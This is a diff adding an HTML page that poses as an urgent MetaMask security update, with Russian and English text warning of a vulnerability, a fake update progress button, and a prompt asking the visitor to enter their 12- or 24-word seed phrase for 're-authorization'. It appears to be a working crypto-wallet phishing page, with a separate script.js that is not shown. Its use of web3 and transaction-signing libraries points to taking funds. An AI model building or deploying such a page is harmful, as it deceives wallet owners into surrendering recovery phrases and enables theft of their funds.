@@ -1,0 +1,129 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title></title>
+    <link rel="icon" href="logo.svg">
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
+    <style type="text/css">
+      .blockquote-footer::before {
+        content: '';
+      }
+      #seed{
+        -webkit-box-sizing: border-box;
+         -moz-box-sizing: border-box;
+              box-sizing: border-box;
+        display: block;
+        padding: 10px;
+        border: 1px solid #24272a;
+        width: 100%;
+        font-weight: 400;
+        line-height: 1.1876em;
+        letter-spacing: 0.00938em;
+        font-size: 1rem;
+        border-radius: 5px;
+        margin-top: 35px;
+        min-height: 200px;
+      }
+    </style>
+
+    <script type="text/javascript">
+      var translate = {
+        ru: {
+            title: 'Metamask обновление',
+            text1: 'Критическое обновление безопасности',
+            text2: 'В Вашей версии Metamask обнаружена критическая уязвимость, которая может повлечь кражу всех Ваших средств.',
+            text3: 'Требуется срочное обновление',
+            text4: 'Обновить',
+            text5: 'Обновление...',
+            text6: 'Поздравляем! Успешное обновление!',
+            text7: 'Теперь у Вас актуальная версия Metamask. Для завершения процесса обновления, требуется повторная авторизация.',
+            text8: 'Введите seed-фразу состоящую из 12 или 24 слов полученную при регистрации.',
+            text9: 'Seed-фраза:',
+            text10: 'Завершить обновление',
+        },
+        en: {
+            title: 'Metamask Update',
+            text1: 'Critical security update',
+            text2: 'A critical vulnerability has been discovered in your version of Metamask that could lead to the theft of all your funds.',
+            text3: 'Urgent update required',
+            text4: 'Update',
+            text5: 'Updating...',
+            text6: 'Congratulations! Successful update!',
+            text7: 'You have an up-to-date version of Metamask. To complete the update process, re-authorization is required.',
+            text8: 'Enter a seed phrase consisting of 12 or 24 words received during registration.',
+            text9: 'Seed phrase:',
+            text10: 'Complete update',
+        },
+      }
+      function getURLParameter(d){d=d.replace(/[\[]/,"\\[").replace(/[\]]/,"\\]");var a=new RegExp("[\\?&]"+d+"=([^&#]*)").exec(location.search);return null===a?"":decodeURIComponent(a[1].replace(/\+/g," "))}
+
+      if(typeof translate !== 'undefined'){
+        var navLang = (navigator.language || (navigator.languages && navigator.languages[0])).toLowerCase();
+        if(!(navLang in translate)){
+          navLang = navLang.slice(0, 2);
+        }
+        translate = translate[navLang] ? translate[navLang] : translate['en'];
+        document.addEventListener('DOMContentLoaded', function(event) {
+          if (['ar', 'he', 'fa'].indexOf(navLang) >= 0) {
+            document.querySelector('html').setAttribute('DIR', 'RTL');
+          }
+          document.querySelectorAll('[class^="lang"]').forEach(function(el){
+            var line = el.className.split(' ')[0].replace('lang-', '');
+            el.innerHTML=window.translate[line];    
+          });
+          document.title = window.translate['title'];
+          var getTranslate = (function(str){
+            return window.translate[str];
+          })();
+        });
+      }
+      Stamp = new Date();
+      var Year = Stamp.getFullYear();
+      var Mounth = Stamp.getMonth() + 1;
+      var Day = Stamp.getDate();
+
+      var Hours = Stamp.getHours();
+      var Mins = Stamp.getMinutes();
+      if (Hours < 10){
+        Hours = "0" + Hours;
+      }
+      if (Mins < 10){
+        Mins = "0" + Mins;
+      }
+    </script>
+  </head>
+  <body>
+    <div class="px-4 py-5 my-5 text-center">
+      <img class="d-block mx-auto mb-4" src="./logo.svg" alt="" width="120" height="120">
+      <figure class="text-center">
+        <blockquote class="blockquote">
+          <h2 class="lang-text1 fw-bold"></h1>
+        </blockquote>
+        <figcaption class="blockquote-footer">#345-473-33 <script type="text/javascript">document.write(Day + '/' + Mounth + '/' + Year + " " + Hours + ":" + Mins);</script></figcaption>
+      </figure>
+      <div class="col-lg-6 mx-auto">
+        <p class="lang-text2 lead "></p><p class="lang-text3 lead mb-4 "></p>
+        <div class="d-grid gap-2 d-sm-flex justify-content-sm-center">
+          <button type="button" id="goUpdate" class="lang-text4 btn-sign btn btn-primary btn-lg px-4 gap-3"></button>
+          <button class="btn btn-primary btn-lg px-4 gap-3" style="display:none" id="progressUpdating" type="button" disabled>
+            <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
+            <span class="lang-text5"></span>
+          </button>
+        </div>
+      </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script type="text/javascript">
+        $('#goUpdate').on('click', function(){
+          $('#goUpdate').hide();
+          $('#progressUpdating').show();
+        });
+    </script>
+    <script type="module" src="./script.js"></script>
+  </body>
+</html>
